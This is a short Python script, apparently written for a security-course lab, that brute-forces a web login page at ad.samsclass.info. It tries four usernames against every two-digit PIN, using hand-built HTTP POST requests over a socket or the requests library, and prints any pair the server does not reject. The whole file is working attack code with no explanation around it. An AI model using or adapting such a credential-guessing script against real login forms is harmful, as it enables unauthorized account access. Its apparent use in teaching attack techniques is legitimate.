#!/usr/bin/python3
import time
import socket

USE_SOCKET = 1

usernames = ['bill', 'ted', 'sally', 'sue']
pins = [str(num) for num in range(99+1)]
padded_pins = []

for pin in pins:
    if len(pin) == 1:
        padded_pins.append(f'0{pin}')
    else:
        padded_pins.append(pin)

### via socket
if USE_SOCKET:
    for username in usernames:
        for pin in padded_pins:
            s = socket.socket()
            s.settimeout(5)

            target = 'ad.samsclass.info'
            # Copy from request headers of POST
            req = """POST /python/login2r.php HTTP/1.1
Host: ad.samsclass.info
Connection: keep-alive
Content-Length: {}
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cookie: __cfduid=d9813102a20df9a456a0173649766ee001526962474

u={}&p={}""".format(str(len(username) + len(pin) + 5), username, pin)
            s.connect((target, 80))
            #s.send(str.encode(f'HEAD / HTTP/1.1\nHost: {target}\n\n'))
            s.send(req.encode())
            # can use .decode method to print as str rather than bytes
            if 'rejected' not in s.recv(1024).decode():
                print(f'{username}:{pin}')
            s.close()
            #time.sleep(2)

else:
    ### via requests
    import requests

    url = 'http://ad.samsclass.info/python/login2r.php'
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'ad.samsclass.info',
        'Origin': None,
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36'
    }

    for username in usernames:
        for pin in padded_pins:
            data = {
                'u': username,
                'p': pin
            }
            # can use .decode method to print as str rather than bytes

            if 'rejected' not in requests.request('POST', url, data=data, headers=headers).content.decode():
                print(f'{username}:{pin}')
            #time.sleep(2)